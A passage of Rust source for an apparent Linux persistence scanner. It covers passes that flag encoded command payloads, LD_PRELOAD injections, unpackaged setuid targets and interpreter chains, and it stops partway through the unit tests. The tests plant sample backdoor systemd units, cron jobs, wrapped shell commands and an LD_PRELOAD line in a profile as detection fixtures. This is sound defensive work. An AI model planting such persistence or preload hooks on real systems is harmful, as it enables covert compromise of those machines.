        let hex = len == body && command[start..i].iter().all(u8::is_ascii_hexdigit);
        let (threshold, alphabet) = if hex { (HEX_RUN, "hex") } else { (BASE64_RUN, "base64") };
        if len >= threshold && len > best.map_or(0, |(_, seen, _)| seen) {
            best = Some((start, len, alphabet));
        }
    }
    best
}

/// The second half of §8's EncodingAnomaly — the first being the non-UTF-8
/// bytes each collector already reports. It lives here rather than in the
/// collectors so that one threshold, derived from one measurement, governs
/// every mechanism class.
///
/// `Kind::SshAuthorizedKey` is deliberately not exempt. Its key material
/// never reaches `command`: the collector puts the blob's fingerprint in the
/// entry name and the options in `raw`, and sets `command` only from a
/// `command="..."` forced command or an `AuthorizedKeysCommand` directive.
/// Exempting the kind would blind the flag on the one field of that entry
/// that really is a command, and a forced command is where an attacker who
/// already has a key line puts a payload.
fn apply_encoding(entry: &mut Entry) {
    let Some(command) = &entry.command else { return };
    let Some((offset, len, alphabet)) = encoded_run(command) else { return };
    entry.flag(Flag::EncodingAnomaly);
    // Where the run is and how long it is, never the run itself and never a
    // decode of it: §14.2 keeps scan output safe to paste into a ticket, and
    // decoding would be a claim about what the bytes mean rather than a
    // report of what they are. `explain <id>` re-reads the file for anyone
    // who wants to look.
    entry.note("encoded_run", format!("{alphabet}, {len} chars at offset {offset}"));
}

/// Collectors record which file shadows which; deciding that the relationship
/// is worth a flag needs the whole set, so it happens here.
fn apply_shadowing(entries: &mut [Entry]) {
    for e in entries {
        if e.raw.contains_key("shadows") {
            e.flag(Flag::ShadowsVendorUnit);
        }
    }
}

/// A cron job or unit whose target is an unpackaged setuid binary is a
/// different proposition from one that merely runs an unpackaged script. The
/// fact needs two collectors, so it is recorded here.
fn cross_reference_suid(entries: &mut [Entry]) {
    let suspicious: BTreeSet<PathBuf> = entries
        .iter()
        .filter(|e| e.kind == Kind::SuidBinary && matches!(e.provenance, Provenance::Unpackaged))
        .map(|e| e.source.clone())
        .collect();
    if suspicious.is_empty() {
        return;
    }
    for e in entries {
        if e.kind == Kind::SuidBinary {
            continue;
        }
        if let Some(target) = &e.target_path {
            if suspicious.contains(target) {
                e.note("target_is_unpackaged_suid", "true");
            }
        }
    }
}

/// §5 promises an ld_preload entry for every LD_PRELOAD assignment found by
/// the shell and systemd collectors, and §14.4 forbids a collector from
/// knowing about another's output. Both hold if the collectors record the
/// assignment as ordinary data and the entries are made here — which also
/// catches the assignments in PAM environment files, crontabs and udev rules
/// that neither section thought to list.
fn preload_entries(root: &Root, entries: &[Entry]) -> Vec<Entry> {
    let mut out = Vec::new();
    let mut seen: BTreeSet<(PathBuf, String)> = BTreeSet::new();

    for carrier in entries {
        if carrier.kind == Kind::LdPreload {
            continue;
        }
        for (key, value) in &carrier.raw {
            if !matches!(key.as_str(), "env.LD_PRELOAD" | "env.LD_AUDIT" | "env.LD_LIBRARY_PATH") {
                continue;
            }
            let variable = key.trim_start_matches("env.");
            for library in value.split([' ', ':', '\n']).filter(|s| !s.is_empty()) {
                if !seen.insert((carrier.source.clone(), library.to_string())) {
                    continue;
                }
                let mut e = Entry::new(Kind::LdPreload, &carrier.source, library);
                e.rekey(&root.rel(&carrier.source));
                e.command = Some(format!("{variable}={library}").into_bytes());
                e.target_path = Some(root.abs(root.rel(Path::new(library))));
                e.trigger = carrier.trigger;
                e.principal = carrier.principal.clone();
                e.owner_uid = carrier.owner_uid;
                e.mode = carrier.mode;
                e.mtime = carrier.mtime;
                e.enabled = carrier.enabled;
                e.note("variable", variable);
                e.note("declared_in", carrier.source.to_string_lossy());
                e.note("declared_by_entry", &carrier.id);
                out.push(e);
            }
        }
    }
    out
}

// -------------------------------------------------- the interpreter chain ----

/// Bytes read from a referenced script. The shebang is the first line; the
/// rest is the window in which a second file the script hands control to is
/// still the obvious next link rather than a guess about control flow.
const SCRIPT_HEAD: usize = 8 * 1024;

/// §5's third deep finding — "scripts referenced by entries but living
/// outside any package" — reduced to the part nothing else answers. An
/// entry's own target is resolved above: a cron job running an unpackaged
/// script already reports `Unpackaged` and a `target_provenance` note. The
/// link after that one is unreported. A script can be packaged, unmodified
/// and still name `/opt/python3.11/bin/python` in its shebang, or source a
/// second file out of /tmp; the executable an entry points at is only the
/// first hop, and `target_path` here is the next one so that the pass above
/// resolves its provenance too.
///
/// It is enrichment rather than a collector because "referenced by entries"
/// is exactly the relation §14.4 forbids a collector from seeing. Nothing is
/// traversed — every file read here was already named by an entry — so the
/// `--deep` gate §5 puts on this finding buys nothing and is not applied.
///
/// One hop, and only where the path is written out in full. A `source
/// "$DIR/x"`, a relative interpreter, or anything else the shell would have
/// to expand is left alone rather than guessed at, and nothing recurses: the
/// entries this emits are not themselves followed.
fn interpreter_chain(root: &Root, entries: &[Entry]) -> Vec<Entry> {
    use std::os::unix::ffi::OsStrExt;

    let mut out = Vec::new();
    // Keyed on the entry id's own inputs, so that two entries reaching one
    // script — an init script and the rc2.d symlink enabling it — cannot
    // produce the same id twice.
    let mut seen: BTreeSet<(Kind, PathBuf, String)> = BTreeSet::new();

    for carrier in entries {
        let script = match &carrier.target_path {
            Some(target) => root.rel(target),
            None => root.rel(&carrier.source),
        };
        // Stat before opening: a named pipe where a script is expected would
        // block this pass forever, and a directory or device node is not a
        // script. Resolving the link is deliberate, because the kernel reads
        // the shebang of whatever the link points at, and the root handle
        // keeps that resolution inside the scan root.
        if !matches!(root.stat_follow(&script), Ok(m) if m.is_file) {
            continue;
        }
        let Ok((head, _)) = root.read_capped(&script, SCRIPT_HEAD) else { continue };
        // No shebang, no script. It also keeps this off the ELF binaries most
        // entries point at, where bytes that read like `exec /tmp/x` are a
        // coincidence of the file's data rather than a command.
        let Some(after) = head.strip_prefix(b"#!") else { continue };
        let first = &after[..after.iter().position(|b| *b == b'\n').unwrap_or(after.len())];

        let mut links: Vec<(&str, Vec<u8>)> = Vec::new();
        links.extend(interpreter_of(first).map(|i| ("shebang", i)));
        links.extend(handed_off(&head));

        for (via, referenced) in links {
            let name = String::from_utf8_lossy(&referenced).into_owned();
            if !seen.insert((carrier.kind, carrier.source.clone(), name.clone())) {
                continue;
            }
            // The kind and source are the carrier's: the mechanism that makes
            // this code run is still cron or systemd, and the file the fact
            // hangs off is the one whose own location and ownership the
            // operator is already being shown.
            let mut e = Entry::new(carrier.kind, &carrier.source, &name);
            e.rekey(&root.rel(&carrier.source));
            let path = Path::new(std::ffi::OsStr::from_bytes(&referenced));
            if path.is_absolute() {
                e.target_path = Some(root.abs(root.rel(path)));
            } else if let Some(found) = resolve_bare_command(root, carrier.kind, &referenced) {
                // `#!/usr/bin/env python3` names env; the interpreter is the
                // argument, and which python3 answers is a question about the
                // search path — the same question a bare ExecStart asks.
                e.note("target_resolved_from", "search path");
                e.target_path = Some(found);
            }
            if std::str::from_utf8(&referenced).is_err() {
                e.flag(Flag::EncodingAnomaly);
                e.note("referenced_raw_hex", crate::entry::hex(&referenced));
            }
            e.command = Some(referenced);
            e.trigger = carrier.trigger;
            e.principal = carrier.principal.clone();
            e.enabled = carrier.enabled;
            e.owner_uid = carrier.owner_uid;
            e.mode = carrier.mode;
            e.mtime = carrier.mtime;
            e.note("chain", via);
            e.note("chain_from", root.abs(&script).to_string_lossy());
            e.note("declared_by_entry", &carrier.id);
            out.push(e);
        }
    }
    out
}

/// The program a shebang line actually starts. `#!/usr/bin/env python3`
/// starts python3 rather than env, and env's own options and `KEY=VALUE`
/// arguments come between the two.
fn interpreter_of(line: &[u8]) -> Option<Vec<u8>> {
    use std::os::unix::ffi::OsStrExt;

    let mut words = line.split(|b: &u8| b.is_ascii_whitespace()).filter(|w| !w.is_empty());
    let first = words.next()?;
    if Path::new(std::ffi::OsStr::from_bytes(first)).file_name() != Some(std::ffi::OsStr::new("env"))
    {
        return Some(first.to_vec());
    }
    Some(words.find(|w| w[0] != b'-' && !w.contains(&b'=')).unwrap_or(first).to_vec())
}

/// Where a shell script hands control on: `source` and `.` pull a second file
/// into the running shell, `exec` replaces the shell with one. Only a literal
/// absolute path counts, because a word carrying a `$` is the shell's to
/// expand and this pass does not run shells.
fn handed_off(head: &[u8]) -> Vec<(&'static str, Vec<u8>)> {
    let mut out = Vec::new();
    for line in head.split(|b| *b == b'\n').skip(1) {
        let mut words = line.split(|b: &u8| b.is_ascii_whitespace()).filter(|w| !w.is_empty());
        let Some(verb) = words.next() else { continue };
        let via = if verb == b"." || verb == b"source" {
            "source"
        } else if verb == b"exec" {
            "exec"
        } else {
            continue;
        };
        let Some(word) = words.next() else { continue };
        let word: Vec<u8> = word.iter().copied().filter(|b| *b != b'"' && *b != b'\'').collect();
        if word.first() == Some(&b'/') && !word.contains(&b'$') {
            out.push((via, word));
        }
    }
    out
}

/// A synthesised preload entry is built after provenance has run, so it needs
/// its own pass over the same machinery.
pub fn enrich_late(root: &Root, scan: &mut Scan) {
    let wanted: BTreeSet<PathBuf> = scan
        .entries
        .iter()
        .filter(|e| e.kind == Kind::LdPreload && e.target_sha256.is_none())
        .filter_map(|e| e.target_path.as_ref().map(|t| root.rel(t)))
        .collect();
    if wanted.is_empty() {
        return;
    }
    let mut failed = Vec::new();
    let answers = match stage(&mut failed, "preload provenance", || provenance::resolve(root, &wanted)) {
        Some(r) => {
            failed.extend(r.failures.into_iter().map(|f| format!("preload provenance: {f}")));
            r.answers
        }
        None => provenance::Answers::new(),
    };
    per_entry(&mut failed, "preload provenance", &mut scan.entries, |e| {
        if e.kind == Kind::LdPreload && e.target_sha256.is_none() {
            apply_provenance(root, e, &answers);
            apply_target(root, e);
        }
    });
    scan.header.enrichment_failures.extend(failed);
}

/// Counts for the run summary, kept here so the renderer stays a renderer.
pub fn flag_counts(scan: &Scan) -> BTreeMap<Flag, usize> {
    let mut out = BTreeMap::new();
    for e in &scan.entries {
        for f in &e.flags {
            *out.entry(*f).or_insert(0) += 1;
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::entry::Trigger;
    use crate::scan::{self, Collector, Ctx, Options};

    struct Planted;

    impl Collector for Planted {
        fn name(&self) -> &'static str {
            "planted"
        }

        fn collect(&self, cx: &mut Ctx) -> Vec<Entry> {
            let mut out = Vec::new();

            let mut e = cx.entry(Kind::SystemdUnit, "etc/systemd/system/evil.service", "evil.service");
            e.command = Some(b"/opt/backdoor --quiet".to_vec());
            e.target_path = Some(PathBuf::from("/opt/backdoor"));
            out.push(e);

            let mut e = cx.entry(Kind::SystemdUnit, "etc/systemd/system/ghost.service", "ghost.service");
            e.command = Some(b"/usr/bin/vanished".to_vec());
            e.target_path = Some(PathBuf::from("/usr/bin/vanished"));
            out.push(e);

            let mut e = cx.entry(Kind::ShellProfile, "etc/profile", "profile");
            e.note("env.LD_PRELOAD", "/tmp/hook.so");
            e.trigger = Trigger::Login;
            out.push(e);

            let mut e = cx.entry(Kind::SystemdUnit, "etc/systemd/system/linked.service", "linked.service");
            e.command = Some(b"/tmp/staging/run.sh".to_vec());
            out.push(e);

            let mut e = cx.entry(Kind::Cron, "etc/cron.d/job", "abc123");
            e.command = Some(b"do-something-unparseable".to_vec());
            out.push(e);

            out
        }
    }

    fn scanned(dir: &Path) -> (Root, Scan) {
        let root = Root::at(dir).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(Planted)];
        let mut scan = scan::run(&root, &Options { deep: false }, &collectors);
        enrich(&root, &mut scan);
        enrich_late(&root, &mut scan);
        (Root::at(dir).unwrap(), scan)
    }

    fn find<'a>(scan: &'a Scan, name: &str) -> &'a Entry {
        scan.entries.iter().find(|e| e.name == name).unwrap_or_else(|| panic!("no entry named {name}"))
    }

    #[test]
    fn a_panicking_stage_costs_its_own_facts_and_nothing_else() {
        let mut failed = Vec::new();
        assert_eq!(stage(&mut failed, "fine", || 7), Some(7));
        assert_eq!(stage(&mut failed, "provenance", || -> u8 { panic!("rpm header lies about its length") }), None);
        assert_eq!(failed, vec!["provenance: rpm header lies about its length".to_string()]);

        let mut entries = vec![
            Entry::new(Kind::Cron, "/etc/crontab", "a"),
            Entry::new(Kind::Cron, "/etc/crontab", "b"),
            Entry::new(Kind::Cron, "/etc/crontab", "c"),
        ];
        let mut failed = Vec::new();
        per_entry(&mut failed, "encoding", &mut entries, |e| {
            if e.name == "b" {
                panic!("hostile bytes");
            }
            e.flag(Flag::EncodingAnomaly);
        });
        assert!(entries[0].has_flag(Flag::EncodingAnomaly) && entries[2].has_flag(Flag::EncodingAnomaly));
        assert_eq!(entries[1].raw["enrichment_failed"], "encoding: hostile bytes");
        assert_eq!(failed.len(), 1);
        assert!(failed[0].contains(entries[1].short_id()));
    }

    #[test]
    fn a_bare_command_is_resolved_before_its_provenance_is_asked() {
        // `* * * * * root backdoor` names /usr/local/bin/backdoor as surely
        // as an absolute path does. Resolving it after the provenance pass
        // meant the file that actually runs was never looked up, and nothing
        // behind it was followed either.
        let dir = std::env::temp_dir().join(format!("unbidden-bare-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        for d in ["etc/cron.d", "etc/alternatives", "usr/local/bin", "usr/bin", "tmp", "var/lib/dpkg/info"] {
            std::fs::create_dir_all(dir.join(d)).unwrap();
        }
        std::fs::write(dir.join("etc/cron.d/job"), b"* * * * * root backdoor\n* * * * * root editor\n* * * * * root tracker\n").unwrap();
        std::fs::write(dir.join("usr/bin/tracker"), b"#!/usr/bin/python3\n").unwrap();
        std::fs::write(dir.join("usr/bin/python3.10"), b"py").unwrap();
        std::os::unix::fs::symlink("python3.10", dir.join("usr/bin/python3")).unwrap();
        std::fs::write(dir.join("usr/bin/shipped-job"), b"* * * * * root /bin/true\n").unwrap();
        std::os::unix::fs::symlink("/usr/bin/shipped-job", dir.join("etc/cron.d/alias")).unwrap();
        std::fs::write(dir.join("usr/local/bin/backdoor"), b"#!/tmp/interp\nexit 0\n").unwrap();
        std::fs::write(dir.join("tmp/interp"), b"elf").unwrap();
        std::fs::write(dir.join("usr/bin/vim.basic"), b"vim").unwrap();
        std::os::unix::fs::symlink("/etc/alternatives/editor", dir.join("usr/bin/editor")).unwrap();
        std::os::unix::fs::symlink("/usr/bin/vim.basic", dir.join("etc/alternatives/editor")).unwrap();
        let md5 = |b: &[u8]| {
            use md5::Digest as _;
            crate::entry::hex(&md5::Md5::digest(b))
        };
        std::fs::write(
            dir.join("var/lib/dpkg/status"),
            b"Package: vim\nStatus: install ok installed\nVersion: 9\n\n\
              Package: python3-minimal\nStatus: install ok installed\nVersion: 3.10\n\n\
              Package: python3.10-minimal\nStatus: install ok installed\nVersion: 3.10.4\n\n\
              Package: jobs\nStatus: install ok installed\nVersion: 1\n\n",
        )
        .unwrap();
        std::fs::write(dir.join("var/lib/dpkg/info/vim.list"), b"/usr/bin/vim.basic\n").unwrap();
        std::fs::write(dir.join("var/lib/dpkg/info/vim.md5sums"), format!("{}  usr/bin/vim.basic\n", md5(b"vim"))).unwrap();
        std::fs::write(dir.join("var/lib/dpkg/info/python3-minimal.list"), b"/usr/bin/python3\n").unwrap();
        std::fs::write(dir.join("var/lib/dpkg/info/python3.10-minimal.list"), b"/usr/bin/python3.10\n").unwrap();
        std::fs::write(
            dir.join("var/lib/dpkg/info/python3.10-minimal.md5sums"),
            format!("{}  usr/bin/python3.10\n", md5(b"py")),
        )
        .unwrap();
        std::fs::write(dir.join("var/lib/dpkg/info/jobs.list"), b"/usr/bin/shipped-job\n").unwrap();
        std::fs::write(dir.join("var/lib/dpkg/info/jobs.md5sums"), format!("{}  usr/bin/shipped-job\n", md5(b"* * * * * root /bin/true\n"))).unwrap();

        let root = Root::at(&dir).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(crate::collect::cron::Cron)];
        let mut scan = scan::run(&root, &Options { deep: false }, &collectors);
        enrich(&root, &mut scan);
        let by_command = |c: &str| {
            scan.entries
                .iter()
                .find(|e| e.command.as_deref() == Some(c.as_bytes()) && !e.raw.contains_key("declared_by_entry"))
                .unwrap_or_else(|| panic!("no entry running {c}"))
        };

        let backdoor = by_command("backdoor");
        assert_eq!(backdoor.target_path.as_deref(), Some(dir.join("usr/local/bin/backdoor").as_path()));
        assert_eq!(backdoor.raw["target_provenance"], "unpackaged");
        assert!(backdoor.has_flag(Flag::Unpackaged));
        let chained = scan
            .entries
            .iter()
            .find(|e| e.raw.get("declared_by_entry") == Some(&backdoor.id))
            .expect("the script behind the bare name is followed to its interpreter");
        assert_eq!(chained.name, "/tmp/interp");
        assert!(chained.has_flag(Flag::Unpackaged));

        // A script's interpreter reached through a link dpkg cannot verify:
        // /usr/bin/python3 -> python3.10 is listed by one package and the
        // file it names is shipped, with a digest, by another.
        let chained = scan.entries.iter().find(|e| e.name == "/usr/bin/python3").expect("the shebang is followed");
        assert!(matches!(
            &chained.provenance,
            Provenance::Packaged { package, integrity: Integrity::Intact, .. } if package == "python3.10-minimal"
        ), "{:?}", chained.provenance);
        assert_eq!(chained.raw["resolves_to"], dir.join("usr/bin/python3.10").to_string_lossy());

        // An alias link that is an entry's own source keeps its own verdict:
        // the link is the evidence.
        let alias = scan.entries.iter().find(|e| e.source == dir.join("etc/cron.d/alias")).expect("alias");
        assert!(alias.has_flag(Flag::Unpackaged));

        // An update-alternatives link belongs to no package; the file at the
        // end of it does, and is what runs.
        let editor = by_command("editor");
        assert_eq!(editor.raw["target_provenance"], "vim (intact)");
        assert_eq!(editor.raw["target_resolves_to"], dir.join("usr/bin/vim.basic").to_string_lossy());
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_wrapper_is_looked_through_to_what_it_runs() {
        let dir = std::env::temp_dir().join(format!("unbidden-wrappers-{}", std::process::id()));
        for d in ["usr/bin", "usr/local/bin", "bin", "sbin", "opt"] {
            std::fs::create_dir_all(dir.join(d)).unwrap();
        }
        for f in [
            "usr/bin/env", "usr/bin/nice", "usr/bin/sudo", "usr/bin/timeout", "usr/bin/flock", "usr/bin/true",
            "usr/bin/cat", "usr/bin/logger", "usr/bin/sed", "bin/sh", "bin/bash", "sbin/modprobe",
            "usr/local/bin/evil", "opt/x",
        ] {
            std::fs::write(dir.join(f), b"").unwrap();
        }
        let root = Root::at(&dir).unwrap();
        let run = |command: &str, target: Option<&str>| {
            let mut e = Entry::new(Kind::SystemdUnit, dir.join("etc/systemd/system/u.service"), "u.service");
            e.command = Some(command.as_bytes().to_vec());
            e.target_path = target.map(|t| dir.join(t));
            let more = look_through_wrappers(&root, std::slice::from_mut(&mut e));
            (e, more)
        };
        let lands = |command: &str, target: &str, want: Option<&str>, by: &str| {
            let (e, more) = run(command, Some(target));
            assert_eq!(e.target_path, want.map(|w| dir.join(w)), "{command}");
            assert_eq!(e.raw.get("target_wrapped_by").map(String::as_str), Some(by), "{command}");
            assert!(more.is_empty(), "{command}");
        };

        lands("env FOO=1 evil", "usr/bin/env", Some("usr/local/bin/evil"), "env");
        lands("-/usr/bin/nice -n 5 /opt/x --flag", "usr/bin/nice", Some("opt/x"), "nice");
        lands("/bin/sh -c '/opt/x --quiet'", "bin/sh", Some("opt/x"), "sh");
        lands("/bin/sh /opt/x", "bin/sh", Some("opt/x"), "sh");
        lands("/bin/sh -c 'exec evil --daemon'", "bin/sh", Some("usr/local/bin/evil"), "sh exec");
        lands("sudo -u bob env nohup evil", "usr/bin/sudo", Some("usr/local/bin/evil"), "sudo env nohup");
        lands("timeout -s KILL 30 evil", "usr/bin/timeout", Some("usr/local/bin/evil"), "timeout");
        lands("flock /run/l -c 'evil a'", "usr/bin/flock", Some("usr/local/bin/evil"), "flock");
        lands("flock /run/l /opt/x", "usr/bin/flock", Some("opt/x"), "flock");
        // A -c inside a cluster of short options.
        lands("/bin/bash -lc '/opt/x --y'", "bin/bash", Some("opt/x"), "bash");
        lands("/bin/sh -ec '/usr/bin/true'", "bin/sh", Some("usr/bin/true"), "sh");
        lands("/usr/bin/env -S \"/tmp/evil a\"", "usr/bin/env", Some("tmp/evil"), "env");
        lands("/bin/sh -c 'FOO=1 BAR=2 /tmp/evil'", "bin/sh", Some("tmp/evil"), "sh");
        // A builtin in front no longer stands in for the command after it.
        lands("/bin/sh -c 'true; /tmp/evil'", "bin/sh", Some("tmp/evil"), "sh");
        lands("/bin/sh -c '[ -x /tmp/evil ] && /tmp/evil'", "bin/sh", Some("tmp/evil"), "sh");
        // Naming nothing that can be found reads as unresolvable, not as the
        // wrapper.
        lands("/bin/sh -c 'cd /tmp && ./evil'", "bin/sh", None, "sh");
        lands("env", "usr/bin/env", None, "env");
        lands("env notinstalled", "usr/bin/env", None, "env");

        // More than one program: one entry each, declared by the carrier,
        // whose own target stays the shell.
        let many = |command: &str, want: &[Option<&str>]| {
            let (e, more) = run(command, Some("bin/sh"));
            assert_eq!(e.target_path, Some(dir.join("bin/sh")), "{command}");
            assert_eq!(e.raw["runs_commands"], want.len().to_string(), "{command}");
            let got: Vec<_> = more.iter().map(|m| m.target_path.clone()).collect();
            assert_eq!(got, want.iter().map(|w| w.map(|w| dir.join(w))).collect::<Vec<_>>(), "{command}");
            for m in &more {
                assert_eq!(m.raw["declared_by_entry"], e.id);
                assert_eq!(m.source, e.source);
            }
            more
        };
        many("/bin/sh -c '/opt/x; /sbin/modprobe nf_tables'", &[Some("opt/x"), Some("sbin/modprobe")]);
        many("/bin/sh -c 'evil|logger'", &[Some("usr/local/bin/evil"), Some("usr/bin/logger")]);
        many("/bin/sh -c '/opt/x -i $$1 2>/dev/null | sed -n p >&2'", &[Some("opt/x"), Some("usr/bin/sed")]);
        many("/bin/sh -c \"/opt/x -- $(cat /proc/cmdline)\"", &[Some("opt/x"), Some("usr/bin/cat")]);
        let named = many("/bin/sh -c '$CMD --go; /opt/x'", &[None, Some("opt/x")]);
        assert_eq!(named[0].name, "$CMD", "an unknowable command word is still named");

        // Only builtins, or a shell with nothing to run: the shell is what runs.
        for bare in ["/bin/sh -c 'true'", "-/bin/sh"] {
            let (e, more) = run(bare, Some("bin/sh"));
            assert_eq!(e.target_path, Some(dir.join("bin/sh")), "{bare}");
            assert!(!e.raw.contains_key("target_wrapped_by") && more.is_empty(), "{bare}");
        }
        // Shell text as the whole command, as cron runs it.
        let (cron, _) = run("true; /tmp/evil", Some("usr/bin/true"));
        assert_eq!(cron.target_path, Some(dir.join("tmp/evil")));
        assert!(!cron.raw.contains_key("target_wrapped_by"), "nothing wrapped it");
        // Not a wrapper, or a target the collector took from elsewhere.
        let (plain, more) = run("/opt/x arg", Some("opt/x"));
        assert_eq!(plain.target_path, Some(dir.join("opt/x")));
        assert!(plain.raw.is_empty() && more.is_empty());
        let (elsewhere, _) = run("env evil", Some("usr/lib/security/pam_exec.so"));
        assert_eq!(elsewhere.target_path, Some(dir.join("usr/lib/security/pam_exec.so")));
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_target_the_lookup_did_not_answer_keeps_its_entry_in_view() {
        let dir = std::env::temp_dir().join(format!("unbidden-unanswered-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let root = Root::at(&dir).unwrap();
        let mut e = Entry::new(Kind::SystemdUnit, dir.join("etc/systemd/system/x.service"), "x.service");
        e.target_path = Some(dir.join("usr/sbin/x"));
        let intact = Provenance::Packaged {
            package: "x".into(),
            version: "1".into(),
            integrity: Integrity::Intact,
        };

        // The unit's own package answered; whatever would have answered for
        // its target panicked and left nothing.
        let mut answers = provenance::Answers::new();
        answers.insert(PathBuf::from("etc/systemd/system/x.service"), intact.clone());
        apply_provenance(&root, &mut e, &answers);
        assert_eq!(e.raw["target_provenance"], "unanswered");
        assert!(!crate::render::suppressed(&e), "an unverified target must not be hidden");

        // A later pass that was not asked about the target keeps what the
        // first one found.
        answers.insert(PathBuf::from("usr/sbin/x"), intact);
        apply_provenance(&root, &mut e, &answers);
        assert_eq!(e.raw["target_provenance"], "x (intact)");
        apply_provenance(&root, &mut e, &provenance::Answers::new());
        assert_eq!(e.raw["target_provenance"], "x (intact)");
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn enrichment_resolves_provenance_targets_links_and_preloads() {
        let dir = std::env::temp_dir().join(format!("unbidden-enrich-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        for d in ["etc/systemd/system", "etc/cron.d", "opt", "tmp/staging", "var/lib/dpkg/info"] {
            std::fs::create_dir_all(dir.join(d)).unwrap();
        }
        std::fs::write(dir.join("opt/backdoor"), b"payload").unwrap();
        std::fs::write(dir.join("tmp/staging/run.sh"), b"#!/bin/sh\n").unwrap();
        std::fs::write(dir.join("etc/profile"), b"export LD_PRELOAD=/tmp/hook.so\n").unwrap();
        std::fs::write(dir.join("etc/systemd/system/evil.service"), b"[Service]\n").unwrap();
        std::fs::write(dir.join("etc/systemd/system/ghost.service"), b"[Service]\n").unwrap();
        std::fs::write(dir.join("etc/cron.d/job"), b"* * * * * root x\n").unwrap();
        std::os::unix::fs::symlink("/tmp/staging/run.sh", dir.join("etc/systemd/system/linked.service")).unwrap();
        // A package database must exist, or every verdict is Unknown rather
        // than Unpackaged.
        std::fs::write(dir.join("var/lib/dpkg/status"), b"Package: base-files\nVersion: 13\n\n").unwrap();
        std::fs::write(dir.join("var/lib/dpkg/info/base-files.list"), b"/etc/profile\n").unwrap();
        let shipped = {
            use md5::Digest as _;
            let mut h = md5::Md5::new();
            h.update(b"export LD_PRELOAD=/tmp/hook.so\n");
            crate::entry::hex(&h.finalize())
        };
        std::fs::write(
            dir.join("var/lib/dpkg/info/base-files.md5sums"),
            format!("{shipped}  etc/profile\n"),
        )
        .unwrap();

        let (_root, scan) = scanned(&dir);

        let evil = find(&scan, "evil.service");
        assert!(evil.has_flag(Flag::Unpackaged));
        assert!(!evil.has_flag(Flag::TargetMissing), "the target is present");
        assert!(evil.target_sha256.is_some(), "the reported digest is of the target");

        let ghost = find(&scan, "ghost.service");
        assert!(ghost.has_flag(Flag::TargetMissing), "an orphaned entry is the cheapest real finding");

        let linked = find(&scan, "linked.service");
        assert!(linked.has_flag(Flag::NonStandardLocation), "a unit linked out of the search path");
        assert!(linked.has_flag(Flag::HiddenPath), "and into a world-writable directory");

        let unparseable = find(&scan, "abc123");
        assert!(unparseable.has_flag(Flag::TargetUnresolvable));

        let preload = scan.entries.iter().find(|e| e.kind == Kind::LdPreload).expect("preload entry");
        assert_eq!(preload.name, "/tmp/hook.so");
        assert_eq!(preload.trigger, Trigger::Login);
        assert_eq!(preload.raw["declared_in"], dir.join("etc/profile").to_string_lossy());
        assert!(preload.has_flag(Flag::TargetMissing), "the library itself is not even there");
        assert_eq!(preload.command.as_deref(), Some(b"LD_PRELOAD=/tmp/hook.so".as_slice()));

        // The profile file is packaged and untouched, so it is exactly the
        // sort of row the default view hides — while the preload entry it
        // spawned is not.
        let profile = find(&scan, "profile");
        assert!(profile.provenance.is_packaged_intact());
        assert!(crate::render::suppressed(profile));
        assert!(!crate::render::suppressed(preload));

        std::fs::remove_dir_all(&dir).unwrap();
    }

    /// Entries whose targets are scripts, so the chain pass has something to
    /// read past. Every one of them is a cron job, because the mechanism is
    /// not what is under test — the link after the target is.
    struct Referencing;

    impl Collector for Referencing {
        fn name(&self) -> &'static str {
            "referencing"
        }

        fn collect(&self, cx: &mut Ctx) -> Vec<Entry> {
            let jobs = [
                ("backup", "/usr/local/bin/backup.sh"),
                ("report", "/usr/local/bin/report.py"),
                ("collect", "/usr/local/bin/collect"),
                ("weird", "/usr/local/bin/weird.sh"),
                // A named pipe where a script is expected, and a binary that
                // is not a script at all.
                ("pipe", "/usr/local/bin/pipe"),
                ("elf", "/usr/bin/true"),
            ];
            jobs.iter()
                .map(|(job, target)| {
                    let mut e = cx.entry(Kind::Cron, format!("etc/cron.d/{job}"), *job);
                    e.command = Some(format!("{target} --nightly").into_bytes());
                    e.target_path = Some(PathBuf::from(target));
                    e.trigger = Trigger::Schedule;
                    e.principal = Some("root".to_string());
                    e
                })
                .collect()
        }
    }

    #[test]
    fn the_interpreter_a_referenced_script_names_is_resolved_in_its_own_right() {
        let dir = std::env::temp_dir().join(format!("unbidden-chain-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        let write = |rel: &str, body: &[u8]| {
            let p = dir.join(rel);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(p, body).unwrap();
        };

        for job in ["backup", "report", "collect", "weird", "pipe", "elf"] {
            write(&format!("etc/cron.d/{job}"), b"@daily root x\n");
        }
        write("bin/sh", b"\x7fELF");
        write("usr/local/bin/backup.sh", b"#!/bin/sh\n. /tmp/stage.sh\nexec /opt/tool --now\n");
        write("usr/local/bin/report.py", b"#!/usr/bin/env python3 -u\nprint(1)\n");
        write("usr/local/bin/python3", b"\x7fELF");
        write("usr/local/bin/collect", b"#!/opt/python3.11/bin/python\n");
        write("usr/local/bin/weird.sh", b"#!/opt/\xff\xfe/py\n");
        // An ELF whose bytes happen to spell a command: no shebang, so it is
        // never read as a script.
        write("usr/bin/true", b"\x7fELF\x02\x01exec /tmp/planted\n");
        rustix::fs::mknodat(
            rustix::fs::CWD,
            dir.join("usr/local/bin/pipe"),
            rustix::fs::FileType::Fifo,
            rustix::fs::Mode::from_raw_mode(0o644),
            0,
        )
        .unwrap();

        // A package owns the cron files, the shell and the collect script, so
        // that Unpackaged on a chained entry can only have come from what the
        // script itself named.
        let owned = ["etc/cron.d/backup", "etc/cron.d/collect", "bin/sh", "usr/local/bin/collect"];
        write("var/lib/dpkg/status", b"Package: backup-tools\nStatus: install ok installed\nVersion: 1.2\n\n");
        write(
            "var/lib/dpkg/info/backup-tools.list",
            owned.map(|p| format!("/{p}\n")).concat().as_bytes(),
        );
        let sums: String = owned
            .iter()
            .map(|p| {
                use md5::Digest as _;
                let mut h = md5::Md5::new();
                h.update(std::fs::read(dir.join(p)).unwrap());
                format!("{}  {p}\n", crate::entry::hex(&h.finalize()))
            })
